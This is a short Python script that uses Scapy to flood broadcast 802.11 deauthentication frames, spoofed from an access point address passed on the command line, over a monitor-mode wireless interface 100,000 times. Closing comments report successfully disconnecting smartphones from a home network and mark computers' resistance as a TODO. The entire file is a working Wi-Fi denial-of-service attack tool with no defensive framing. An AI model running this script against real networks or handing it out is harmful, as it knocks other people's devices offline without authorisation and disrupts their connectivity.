#!/usr/bin/python
# ^This ensures that the script is run under correct context 

#Suppress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import sys

bmac = "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() /\
        Dot11(addr1=bmac, addr2=sys.argv[1], addr3=sys.argv[1]) /\
        Dot11Deauth(reason=3)

sendp(pkt, iface="wlan0mon", count = 100000, inter = .01)

'''
addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
multi-APs to one gateway

Tip: Some clients ignore broadcast deauthentications
Successfuly deauthed smartphones from home network
Computers seem to ignore broadcast deauth <<<<<< TODO
'''